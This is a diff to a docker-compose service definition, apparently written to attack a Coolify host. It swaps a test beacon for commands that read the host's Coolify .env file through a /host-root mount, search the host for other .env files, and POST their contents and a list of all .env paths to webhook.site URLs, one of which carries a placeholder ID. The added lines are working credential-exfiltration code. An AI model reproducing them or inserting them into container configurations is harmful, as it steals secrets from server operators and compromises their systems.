@@ -11,5 +11,19 @@ services:
       - -c
       - |
         apk add --no-cache curl
-        echo "PAYLOAD_WORKS" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=test
+        
+        # 1. Пытаемся прочитать главный .env Coolify (стандартный путь)
+        cat /host-root/data/coolify/.env > /tmp/main_env.txt 2>/dev/null
+        
+        # 2. Если файл пустой, ищем любой .env вне папок applications/services
+        if [ ! -s /tmp/main_env.txt ]; then
+          find /host-root -name ".env" -type f -not -path "*/applications/*" -not -path "*/services/*" | head -1 | xargs cat > /tmp/main_env.txt 2>/dev/null
+        fi
+        
+        # 3. Отправляем содержимое .env
+        cat /tmp/main_env.txt | curl -X POST --data-binary @- https://webhook.site/ТВОЙ-НОВЫЙ-URL?stage=main_env
+        
+        # 4. Отправляем список всех .env файлов для отладки (если первый не сработал)
+        find /host-root -name ".env" -type f | curl -X POST --data-binary @- https://webhook.site/ТВОЙ-НОВЫЙ-URL?stage=env_list
+        
         sleep 3600
